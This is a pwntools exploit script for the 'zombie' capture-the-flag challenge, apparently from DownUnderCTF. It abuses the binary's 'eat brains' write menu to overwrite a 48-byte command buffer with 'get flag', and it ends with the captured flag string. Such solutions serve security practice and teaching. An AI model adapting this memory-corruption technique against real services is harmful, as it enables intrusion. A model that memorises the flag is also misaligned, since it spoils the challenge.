#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import

import sys
import os
from pwn import *


def infect(num):
    p.sendlineafter("What will you do?", "infect")
    p.sendlineafter("you infect?", str(num))


def eat_brains(pairs):
    p.sendlineafter("What will you do?", "eat brains")
    for (idx, val) in pairs:
        p.sendlineafter("victim.", str(idx))
        p.sendlineafter("Munch!", str(val))
    p.sendlineafter("victim.", "done")


def inspect_brains(victims):
    res = b""
    p.sendlineafter("What will you do?", "inspect brains")
    for victim in victims:
        p.sendlineafter("brain.", str(victim))
        p.recvuntil("is thinking: ")
        res += (p8(int(p.recvline(keepends=False))))
    p.sendlineafter("brain.", "done")
    return res


def exploit():
    infect(48)

    p.sendlineafter("What will you do?", "eat brains".ljust(48, " "))
    payload = "get flag".ljust(48, " ")
    for (idx, val) in [(x, ord(payload[x])) for x in range(48)]:
        p.sendlineafter("victim.", str(idx))
        p.sendlineafter("Munch!", str(val))
    p.sendlineafter("victim.", "done")

    p.interactive()


if __name__ == "__main__":
    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    name = "./zombie"

    if len(sys.argv) > 1:
        binary = ELF(name, checksec=False)
        p = remote("chal.duc.tf", 30008)
    else:
        binary = ELF(name, checksec=False)
        p = process(name, env={})
        gdb.attach(p, gdbscript="""
        c
        """)
    exploit()

# DUCTF{m3m0ry_s4f3ty_h4ck3d!}
